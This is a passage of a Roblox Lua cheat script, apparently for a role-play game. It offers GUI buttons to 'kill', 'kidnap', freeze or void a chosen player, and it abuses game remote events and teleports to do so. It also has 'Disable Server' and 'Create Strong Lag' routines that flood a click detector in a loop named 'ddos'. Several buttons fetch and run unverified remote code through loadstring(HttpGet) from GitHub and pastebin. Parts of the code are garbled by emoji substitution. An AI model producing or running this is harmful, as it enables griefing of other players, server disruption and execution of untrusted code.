  -- Equip 'Couch' item in inventory if not equipped yet
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack and not couchEquipped then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  game.Players.LocalPlayer.Character.Humanoid:EquipTool(couch)
  couchEquipped = true
  else
  print("Item 'Couch' not found in your inventory.")
  end
  end
 
  -- Looping teleports to selected player from list
  while true do
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
  wait(0.0) -- Interval between each teleport, adjust as needed
 
  -- Check if player sat on 'Couch' and perform teleport to sky
  if player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.SeatPart then
  player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up again
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-107.91380310058594, -10.128937721252441, 261.37420654296875) -- Teleport back to original position
  break -- Exit loop after teleporting back
  end
  end
 
  --Small
  local args = {
  [1] = "CharacterSizeUp",
  [2] = 1
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
 
  -- Remove 'Couch' item from player's hand after sky teleport
  if couchEquipped then
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  couch.Parent = nil -- Remove 'Couch' from inventory
  couchEquipped = false
  end
  end
  end
  else
  print("Player not found.")
  end
  else
  print("No player selected for Advanced Bring.")
  end
  end
 
  local function SafeVoidAdvancedPlayer()
  if selectedKillAdvancedPlayer then
  local player = game.Players:FindFirstChild(selectedKillAdvancedPlayer)
  if player then
  --big
  local args = {
  [1] = "CharacterSizeDown",
  [2] = 5
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
  -- Equip 'Couch' item in inventory if not equipped yet
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack and not couchEquipped then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  game.Players.LocalPlayer.Character.Humanoid:EquipTool(couch)
  couchEquipped = true
  else
  print("Item 'Couch' not found in your inventory.")
  end
  end
 
  -- Looping teleports to selected player from list
  while true do
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
  wait(0.0) -- Interval between each teleport, adjust as needed
 
  -- Check if player sat on 'Couch' and perform teleport to sky
  if player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.SeatPart then
  player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up again
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(462.886474609375, -75.30844116210938, 123.47378540039062) -- Teleport back to original position
  break -- Exit loop after teleporting back
  end
  end
 
  --Small
  local args = {
  [1] = "CharacterSizeUp",
  [2] = 1
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
 
  -- Remove 'Couch' item from player's hand after sky teleport
  if couchEquipped then
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  couch.Parent = nil -- Remove 'Couch' from inventory
  couchEquipped = false
  end
  end
  end
  else
  print("Player not found.")
  end
  else
  print("No player selected for Advanced Bring.")
  end
  end
 
  local function BowAdvancedPlayer()
  if selectedKillAdvancedPlayer then
  local player = game.Players:FindFirstChild(selectedKillAdvancedPlayer)
  if player then
  --big
  local args = {
  [1] = "CharacterSizeDown",
  [2] = 5
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
  -- Equip 'Couch' item in inventory if not equipped yet
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack and not couchEquipped then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  game.Players.LocalPlayer.Character.Humanoid:EquipTool(couch)
  couchEquipped = true
  else
  print("Item 'Couch' not found in your inventory.")
  end
  end
 
  -- Looping teleports to selected player from list
  while true do
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
  wait(0.0) -- Interval between each teleport, adjust as needed
 
  -- Check if player sat on 'Couch' and perform teleport to sky
  if player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.SeatPart then
  player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up again
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-588.5294189453125, 8.251455307006836, -182.5675506591797) -- Teleport back to original position
  break -- Exit loop after teleporting back
  end
  end
 
  --Small
  local args = {
  [1] = "CharacterSizeUp",
  [2] = 1
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
 
  -- Remove 'Couch' item from player's hand after sky teleport
  if couchEquipped then
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  couch.Parent = nil -- Remove 'Couch' from inventory
  couchEquipped = false
  end
  end
  end
  else
  print("Player not found.")
  end
  else
  print("No player selected for Advanced Bring.")
  end
  end
 
  local function PlaneAdvancedPlayer()
  if selectedKillAdvancedPlayer then
  local player = game.Players:FindFirstChild(selectedKillAdvancedPlayer)
  if player then
  --big
  local args = {
  [1] = "CharacterSizeDown",
  [2] = 5
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
  -- Equip 'Couch' item in inventory if not equipped yet
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack and not couchEquipped then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  game.Players.LocalPlayer.Character.Humanoid:EquipTool(couch)
  couchEquipped = true
  else
  print("Item 'Couch' not found in your inventory.")
  end
  end
 
  -- Looping teleports to selected player from list
  while true do
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
  wait(0.0) -- Interval between each teleport, adjust as needed
 
  -- Check if player sat on 'Couch' and perform teleport to sky
  if player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.SeatPart then
  player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up again
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(665.856201171875, 3.6353466510772705, 89.86775970458984) -- Teleport back to original position
  break -- Exit loop after teleporting back
  end
  end
 
  --Small
  local args = {
  [1] = "CharacterSizeUp",
  [2] = 1
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
 
  -- Remove 'Couch' item from player's hand after sky teleport
  if couchEquipped then
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  couch.Parent = nil -- Remove 'Couch' from inventory
  couchEquipped = false
  end
  end
  end
  else
  print("Player not found.")
  end
  else
  print("No player selected for Advanced Bring.")
  end
  end
 
  local function LagAdvancedPlayer()
  if selectedKillAdvancedPlayer then
  local player = game.Players:FindFirstChild(selectedKillAdvancedPlayer)
  if player then
  -- Equip 'Couch' item in inventory if not equipped yet
  --big
  local args = {
  [1] = "CharacterSizeDown",
  [2] = 5
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack and not couchEquipped then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  game.Players.LocalPlayer.Character.Humanoid:EquipTool(couch)
  couchEquipped = true
  else
  print("Item 'Couch' not found in your inventory.")
  end
  end
 
  -- Looping teleports to selected player from list
  while true do
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
  wait(0.0) -- Interval between each teleport, adjust as needed
 
  -- Check if player sat on 'Couch' and perform teleport to sky
  if player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.SeatPart then
  player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up again
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(104.80880737304688, 34.60691833496094, 632.2498168945312) -- Teleport back to original position
  break -- Exit loop after teleporting back
  end
  end
 
  --Small
  local args = {
  [1] = "CharacterSizeUp",
  [2] = 1
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
 
  -- Remove 'Couch' item from player's hand after sky teleport
  if couchEquipped then
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  couch.Parent = nil -- Remove 'Couch' from inventory
  couchEquipped = false
  end
  end
  end
  else
  print("Player not found.")
  end
  else
  print("No player selected for Advanced Bring.")
  end
  end
 
  local function BringAdvancedPlayer()
  if selectedKillAdvancedPlayer then
  local player = game.Players:FindFirstChild(selectedKillAdvancedPlayer)
  if player then
  -- Equip 'Couch' item in inventory if not equipped yet
  --big
  local args = {
  [1] = "CharacterSizeDown",
  [2] = 5
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack and not couchEquipped then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  game.Players.LocalPlayer.Character.Humanoid:EquipTool(couch)
  couchEquipped = true
  else
  print("Item 'Couch' not found in your inventory.")
  end
  end
 
  -- Looping teleports to selected player from list
  while true do
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
  wait(0.0) -- Interval between each teleport, adjust as needed
 
  -- Check if player sat on 'Couch' and perform teleport to sky
  if player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.SeatPart then
  player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up again
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-570.4937133789062, 37.714874267578125, 963.8348999023438) -- Teleport back to original position
  break -- Exit loop after teleporting back
  end
  end
 
  --Small
  local args = {
  [1] = "CharacterSizeUp",
  [2] = 1
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
 
  -- Remove 'Couch' item from player's hand after sky teleport
  if couchEquipped then
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  couch.Parent = nil -- Remove 'Couch' from inventory
  couchEquipped = false
  end
  end
  end
  else
  print("Player not found.")
  end
  else
  print("No player selected for Advanced Bring.")
  end
  end
 
  local function SafeVoifAdvancedPlayer()
  if selectedKillAdvancedPlayer then
  local player = game.Players:FindFirstChild(selectedKillAdvancedPlayer)
  if player then
  -- Equip 'Couch' item in inventory if not equipped yet
  --big
  local args = {
  [1] = "CharacterSizeDown",
  [2] = 5
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack and not couchEquipped then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  game.Players.LocalPlayer.Character.Humanoid:EquipTool(couch)
  couchEquipped = true
  else
  print("Item 'Couch' not found in your inventory.")
  end
  end
 
  -- Looping teleports to selected player from list
  while true do
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
  wait(0.0) -- Interval between each teleport, adjust as needed
 
  -- Check if player sat on 'Couch' and perform teleport to sky
  if player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.SeatPart then
  player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up again
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(104.80880737304688, 34.60691833496094, 632.2498168945312) -- Teleport back to original position
  break -- Exit loop after teleporting back
  end
  end
 
  --Small
  local args = {
  [1] = "CharacterSizeUp",
  [2] = 1
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
 
  -- Remove 'Couch' item from player's hand after sky teleport
  if couchEquipped then
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  couch.Parent = nil -- Remove 'Couch' from inventory
  couchEquipped = false
  end
  end
  end
  else
  print("Player not found.")
  end
  else
  print("No player selected for Advanced Bring.")
  end
  end
 
  local function SkyAdvancedPlayer()
  if selectedKillAdvancedPlayer then
  local player = game.Players:FindFirstChild(selectedKillAdvancedPlayer)
  if player then
  -- Equip 'Couch' item in inventory if not equipped yet
  --big
  local args = {
  [1] = "CharacterSizeDown",
  [2] = 5
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack and not couchEquipped then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  game.Players.LocalPlayer.Character.Humanoid:EquipTool(couch)
  couchEquipped = true
  else
  print("Item 'Couch' not found in your inventory.")
  end
  end
 
  -- Looping teleports to selected player from list
  while true do
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
  wait(0.0) -- Interval between each teleport, adjust as needed
 
  -- Check if player sat on 'Couch' and perform teleport to sky
  if player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.SeatPart then
  player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up again
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(104.80880737304688, 34.60691833496094, 632.2498168945312) -- Teleport back to original position
  break -- Exit loop after teleporting back
  end
  end
 
  --Small
  local args = {
  [1] = "CharacterSizeUp",
  [2] = 1
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
 
  -- Remove 'Couch' item from player's hand after sky teleport
  if couchEquipped then
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  couch.Parent = nil -- Remove 'Couch' from inventory
  couchEquipped = false
  end
  end
  end
  else
  print("Player not found.")
  end
  else
  print("No player selected for Advanced Bring.")
  end
  end
 
  local function PriAdvancedPlayer()
  if selectedKillAdvancedPlayer then
  local player = game.Players:FindFirstChild(selectedKillAdvancedPlayer)
  if player then
  -- Equip 'Couch' item in inventory if not equipped yet
  --big
  local args = {
  [1] = "CharacterSizeDown",
  [2] = 5
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack and not couchEquipped then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  game.Players.LocalPlayer.Character.Humanoid:EquipTool(couch)
  couchEquipped = true
  else
  print("Item 'Couch' not found in your inventory.")
  end
  end
 
  -- Looping teleports to selected player from list
  while true do
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
  wait(0.0) -- Interval between each teleport, adjust as needed
 
  -- Check if player sat on 'Couch' and perform teleport to sky
  if player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.SeatPart then
  player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up again
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-783.1765747070312, -517.522216796875, 1115.422119140625) -- Teleport back to original position
  break -- Exit loop after teleporting back
  end
  end
 
  --Small
  local args = {
  [1] = "CharacterSizeUp",
  [2] = 1
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
 
  -- Remove 'Couch' item from player's hand after sky teleport
  if couchEquipped then
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  couch.Parent = nil -- Remove 'Couch' from inventory
  couchEquipped = false
  end
  end
  end
  else
  print("Player not found.")
  end
  else
  print("No player selected for Advanced Bring.")
  end
  end
 
  local function PrisionAdvancedPlayer()
  if selectedKillAdvancedPlayer then
  local player = game.Players:FindFirstChild(selectedKillAdvancedPlayer)
  if player then
  -- Equip 'Couch' item in inventory if not equipped yet
  --big
  local args = {
  [1] = "CharacterSizeDown",
  [2] = 5
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack and not couchEquipped then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  game.Players.LocalPlayer.Character.Humanoid:EquipTool(couch)
  couchEquipped = true
  else
  print("Item 'Couch' not found in your inventory.")
  end
  end
 
  -- Looping teleports to selected player from list
  while true do
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
  wait(0.0) -- Interval between each teleport, adjust as needed
 
  -- Check if player sat on 'Couch' and perform teleport to sky
  if player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.SeatPart then
  player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up again
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-783.1765747070312, -517.522216796875, 1115.422119140625) -- Teleport back to original position
  break -- Exit loop after teleporting back
  end
  end
 
  --Small
  local args = {
  [1] = "CharacterSizeUp",
  [2] = 1
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
 
  -- Remove 'Couch' item from player's hand after sky teleport
  if couchEquipped then
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  couch.Parent = nil -- Remove 'Couch' from inventory
  couchEquipped = false
  end
  end
  end
  else
  print("Player not found.")
  end
  else
  print("No player selected for Advanced Bring.")
  end
  end
 
  local function BugAdvancedPlayer()
  if selectedKillAdvancedPlayer then
  local player = game.Players:FindFirstChild(selectedKillAdvancedPlayer)
  if player then
  -- Equip 'Couch' item in inventory if not equipped yet
  --big
  local args = {
  [1] = "CharacterSizeDown",
  [2] = 5
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack and not couchEquipped then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  game.Players.LocalPlayer.Character.Humanoid:EquipTool(couch)
  couchEquipped = true
  else
  print("Item 'Couch' not found in your inventory.")
  end
  end
 
  -- Looping teleports to selected player from list
  while true do
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
  wait(0.0) -- Interval between each teleport, adjust as needed
 
  -- Check if player sat on 'Couch' and perform teleport to sky
  if player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.SeatPart then
  player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0) -- Teleport up again
  wait(0.0) -- Wait a bit before teleporting back to avoid bugs
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(176.63543701171875, 594.9183959960938, 393.3529052734375) -- Teleport back to original position
  break -- Exit loop after teleporting back
  end
  end
 
  --Small
  local args = {
  [1] = "CharacterSizeUp",
  [2] = 1
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
 
  -- Remove 'Couch' item from player's hand after sky teleport
  if couchEquipped then
  local backpack = game.Players.LocalPlayer.Backpack
  if backpack then
  local couch = backpack:FindFirstChild("Couch")
  if couch then
  couch.Parent = nil -- Remove 'Couch' from inventory
  couchEquipped = false
  end
  end
  end
  else
  print("Player not found.")
  end
  else
  print("No player selected for Advanced Bring.")
  end
  end
 
 
  -- Player list for Advanced Bring
  local killAdvancedPlayerList = {}
  for _, player in ipairs(game.Players:GetPlayers()) do
  table.insert(killAdvancedPlayerList, player.Name)
  end
 
 
 
 
  local function couch()
  local args = {
  [1] = "PickingTools",
  [2] = "Couch"
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
  end
 
  local function shoppingCart()
  local args = {
  [1] = "PickingTools",
  [2] = "ShoppingCart"
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
  end
 
  local function stretcher()
  local args = {
  [1] = "PickingTools",
  [2] = "Stretcher"
  }
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
  end
 
 
  local Dropdown = AddDropdown(Main, {
  Name = "Choose Kill Type",
  Default = "",
  Options = {"Couch", "Shopping Cart 🛒", "Hospital Bed 🛌"},
  Callback = function(value)
  if value == "Couch" then
  couch()
  elseif value == "Shopping Cart 🛒" then
  shoppingCart()
  elseif value == "Hospital Bed 🛌" then
  stretcher()
  end
  end
  })
 
  local killAdvancedPlayerList = {}
  for _, player in ipairs(game.Players:GetPlayers()) do
  table.insert(killAdvancedPlayerList, player.Name)
  end
 
  local function updatePlayerList()
  local players = game.Players:GetPlayers()
  local playerNames = {}
  for _, player in ipairs(players) do
  table.insert(playerNames, player.Name)
  end
  return playerNames
  end
 
  local Dropdown = AddDropdown(Main, {
      Name = "Choose Player",
      Options = killAdvancedPlayerList,
      Callback = function(playerName)
  selectedKillAdvancedPlayer = playerName
  end
  })
 
  AddButton(Main, {
    Name = "Kill Player / 1",
    Callback = function()
    killAdvancedPlayer()
    end
   })
  
   AddButton(Main, {
    Name = "Fly Player to Sky",
    Callback = function()
    BugAdvancedPlayer()
    end
   })
  
   AddButton(Main, {
    Name = "Kill Player / 2",
    Callback = function()
    BowAdvancedPlayer()
    end
   })
  
  
   AddButton(Main, {
    Name = "Hang Player🚫",
    Callback = function()
    SkyAdvancedPlayer()
    end
   })
  
   AddButton(Main, {
    Name = "Freeze Player🚷",
    Callback = function()
    LagAdvancedPlayer()
    end
   })
  
   AddButton(Main, {
    Name = "Kidnap Player 🖇",
    Callback = function()
    FlyAdvancedPlayer()
    end
   })
  
  
                local section = AddSection(Main, {"Idle Scripts"})
 
                 
                AddButton(Main, {
                  Name = "Anti Afk 1",
                  Callback = function()
     --[[
   WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
  ]]
  loadstring(game:HttpGet("https://raw.githubusercontent.com/ArgetnarYT/scripts/main/AntiAfk2.lua"))()
                  end
                })
 
 
     
                  
                AddButton(Main, {
                  Name = "Anti Afk 2",
                  Callback = function()
    
                  end
                })
 
               
                 
                AddButton(Main, {
                  Name = "Anti Afk 2",
                  Callback = function()
     --[[
   WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
  ]]
  loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))();
                  end
                })
               
 
                  
                AddButton(Main, {
                  Name = "Anti Afk 3",
                  Callback = function()
      --[[
   WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
  ]]
  loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/SCRIPTHUBV3/main/SCRIPTHUBV3", true))()
     
                  end
                })
       
                  
                AddButton(Main, {
                  Name = "Anti Afk 4",
                  Callback = function()
     --[[
   WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
  ]]
  loadstring(game:HttpGet("https://raw.githubusercontent.com/YallSumLs/Scripts/refs/heads/main/Anti-Afk"))()
                  end
                })
 
 
                          
                AddButton(Main, {
                  Name = "Anti Afk 5",
                  Callback = function()
                    loadstring(game:HttpGet(('https://raw.githubusercontent.com/RTrade/Voidz/main/AntiAFK.lua'),true))()
                  end
                })
 
                                      
                AddButton(Main, {
                  Name = "Anti Afk 6",
                  Callback = function()
                    loadstring(game:HttpGet("https://pastebin.com/raw/sDXcYFhR",true))()
                  end
                })
 
 
  AddSection(Main, {"Server"})
  AddButton(Main, {
   Name = "Disable Server 🚫",
   Callback = function()
         tools = "FireX"
   lagserver = true
   if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
   task.wait()
   game.Players.LocalPlayer.Character.Humanoid.Sit = false
   end
   if game:GetService("Workspace"):FindFirstChild("Camera") then
   game:GetService("Workspace"):FindFirstChild("Camera")😀estroy() end
   wait(0.1)
   if game:GetService("Workspace"):FindFirstChild("Camera") then
   game:GetService("Workspace"):FindFirstChild("Camera")😀estroy() end
   game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").WorkspaceCom["001_GiveTools"].FireX.CFrame + Vector3.new(0,-15,0)
  task.wait(0.2)
  game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
  ddos = true
   for i=1, 425 do task.wait()
   if ddos == false then
   local args = {
   [1] = "ClearAllTools"
   }
  
   cleartoolremote:FireServer(unpack(args))
    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9999,-475,9999)
    return
   end
   if game:GetService("Workspace"):FindFirstChild("Camera") then
   game:GetService("Workspace"):FindFirstChild("Camera")😀estroy() end
   if game:GetService("Players").LocalPlayer.Character:FindFirstChild(tools) then
   game:GetService("Players").LocalPlayer.Character:FindFirstChild(tools)😀estroy() end
   if ddos == false then return end
   fireclickdetector(game:GetService("Workspace").WorkspaceCom["001_GiveTools"].FireX.ClickDetector,0)
   end
   game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,-475,0)
   wait(15)
   lagserver = false
     end
  })
  AddButton(Main, {
    Name = "Destroy Server☠️🚫",
    Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/ahmidd409/TrollX-V2/refs/heads/main/HackerBrookhaven_TrollX.txt"))()
    end
  })
  AddButton(Main, {
    Name = "Create Strong Lag in Server☠️🚫",
    Callback = function()
  tools = "FireX"
          shutdownserver = true
          if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
              task.wait()
              game.Players.LocalPlayer.Character.Humanoid.Sit = false
          end
          if game:GetService("Workspace"):FindFirstChild("Camera") then
              game:GetService("Workspace"):FindFirstChild("Camera")😀estroy()
          end
          wait(0.1)
          if game:GetService("Workspace"):FindFirstChild("Camera") then
              game:GetService("Workspace"):FindFirstChild("Camera")😀estroy()
          end
          game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").WorkspaceCom["001_GiveTools"].FireX.CFrame + Vector3.new(0, -15, 0)
          task.wait(0.2)
          game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
          ddos = true
          for i = 1, 1350 do
              task.wait()
              if ddos == false then
                  local args = {
                      [1] = "ClearAllTools"
                  }
  
                  cleartoolremote:FireServer(unpack(args))
                  game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
                  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9999, -475, 9999)
                  return
              end
              if game:GetService("Workspace"):FindFirstChild("Camera") then
                  game:GetService("Workspace"):FindFirstChild("Camera")😀estroy()
              end
              if game:GetService("Players").LocalPlayer.Character:FindFirstChild(tools) then
                  game:GetService("Players").LocalPlayer.Character:FindFirstChild(tools)😀estroy()
              end
              if ddos == false then return end
              fireclickdetector(game:GetService("Workspace").WorkspaceCom["001_GiveTools"].FireX.ClickDetector, 0)
